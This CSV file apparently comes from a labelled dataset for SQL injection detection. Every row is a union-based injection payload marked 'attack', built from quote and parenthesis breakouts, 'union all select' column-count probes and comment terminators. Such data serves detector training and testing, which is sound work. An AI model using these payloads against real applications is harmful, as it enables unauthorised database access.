label,payload,family
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",union
attack,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",union
attack,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",union
attack,"1""  )   where 5870  =  5870 union all select null,null,null--",union
attack,"1' where 2774  =  2774 union all select null,null,null,null,null#",union
attack,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",union
attack,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",union
attack,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",union
attack,"-8073   )    )     )   union all select 4481,4481,4481,4481--",union
attack,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",union
attack,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",union
attack,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",union
attack,"-1550' in boolean mode  )   union all select 9777,9777,9777--",union
attack,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",union
attack,-4965  )   as imga where 3705  =  3705 union all select 3705--,union
attack,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",union
attack,"1%""   )    )    union all select null,null,null,null,null--",union
attack,"1'  )   where 8268  =  8268 union all select null,null,null,null--",union
attack,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",union
attack,1'  )   as zmvn where 2887  =  2887 union all select null--,union
attack,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",union
attack,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",union
attack,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null--",union
attack,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",union
attack,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",union
attack,"-3300' union all select 8979,8979,8979,8979,8979,8979--",union
attack,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null#",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",union
attack,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,union
attack,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",union
attack,"1""  )   union all select null,null,null,null,null,null,null--",union
attack,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",union
attack,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",union
attack,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",union
attack,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",union
attack,"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",union
attack,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union
attack,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",union
attack,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",union
attack,"-4711%""   )    )    union all select 6737,6737,6737,6737#",union
attack,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",union
attack,"1 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",union
attack,"1   )    )    union all select null,null,null,null,null,null,null,null--",union
attack,"1"" where 2878  =  2878 union all select null,null,null,null,null#",union
attack,"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",union
